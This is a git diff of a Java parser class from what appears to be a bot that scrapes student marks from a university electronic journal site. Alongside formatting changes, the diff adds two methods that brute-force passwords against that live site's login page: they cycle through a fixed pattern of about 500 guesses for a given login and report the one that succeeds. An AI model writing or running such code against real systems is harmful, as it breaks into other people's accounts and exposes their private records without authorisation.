@@ -4,7 +4,6 @@ import com.artek.Database.DBManager;
 import com.artek.IParser;
 import com.jaunt.*;
 import com.jaunt.component.Table;
-import com.mysql.cj.xdevapi.Collection;
 import org.apache.http.HttpEntity;
 import org.apache.http.NameValuePair;
 import org.apache.http.client.entity.UrlEncodedFormEntity;
@@ -19,6 +18,13 @@ import java.io.IOException;
 import java.util.*;
 
 public class Parser implements IParser {
+
+    private static CloseableHttpClient client;
+
+    public Parser() {
+        client = HttpClients.createDefault();
+    }
+
     @Override
     public Map<String, ArrayList<String>> allDepsMarks(Integer userId) throws IOException, ResponseException, NotFound {
         String resultMessage = null;
@@ -54,14 +60,14 @@ public class Parser implements IParser {
 
         //Making Map of all deps and their marks
         int rawNumber = 1;
-        for (Element dep: cellsDep) {
+        for (Element dep : cellsDep) {
             ArrayList<String> marks = new ArrayList<>();
 
             Elements depRow = table.getRow(rawNumber);
             String depName = depRow.getChildElements().get(1).getTextContent();
             Elements marksElements = depRow.getChildElements().get(2).findFirst("<table>").getChildElements().get(1).findEvery("<td>");
 
-            for (Element depMark: marksElements) {
+            for (Element depMark : marksElements) {
                 marks.add(depMark.getTextContent());
             }
             marks.removeAll(Collections.singleton(""));
@@ -85,7 +91,7 @@ public class Parser implements IParser {
 
 //    public static void main(String[] args) throws IOException {
 
-//        BufferedReader stream = new BufferedReader(new InputStreamReader(System.in));
+    //        BufferedReader stream = new BufferedReader(new InputStreamReader(System.in));
 //        String login = stream.readLine();
 //
 //        EjBot bot = new EjBot(login, password);
@@ -114,4 +120,49 @@ public class Parser implements IParser {
 //        System.out.println("RIGHT PASSWORD IS " + trueFor);
 //
 //    }
+    public static boolean getPasswordByLogin(String login, String password) throws IOException {
+
+        HttpPost post = new HttpPost("http://ej.grsmu.by/prosm_ocenki_stud.php");
+
+        List<NameValuePair> nvps = new ArrayList<NameValuePair>();
+        nvps.add(new BasicNameValuePair("login", login));
+        nvps.add(new BasicNameValuePair("password", password));
+
+        post.setEntity(new UrlEncodedFormEntity(nvps));
+        CloseableHttpResponse response = client.execute(post);
+
+        HttpEntity entity = response.getEntity();
+        String htmlString = EntityUtils.toString(entity, "UTF-8");
+        if (htmlString.length() > 400) {
+            return true;
+        } else {
+            return false;
+        }
+    }
+
+    public static String loop(String login) throws IOException {
+        String password = "18-00";
+        for (int k = 0; k < 5; k++) {
+            for (int i = 0; i < 100; i++) {
+                if (i < 10) {
+
+                    password += k + "0" + i;
+                    //BotLogger.info("LOOP", password);
+                    if (getPasswordByLogin(login, password)) {
+                        return "TRUE FOR" + password;
+                    }
+                    password = "18-00";
+                } else {
+                    //BotLogger.info("LOOP", password);
+                    password += String.valueOf(k) + i;
+
+                    if (getPasswordByLogin(login, password)) {
+                        return "TRUE FOR " + password;
+                    }
+                    password = "18-00";
+                }
+            }
+        }
+        return "FAIL";
+    }
 }
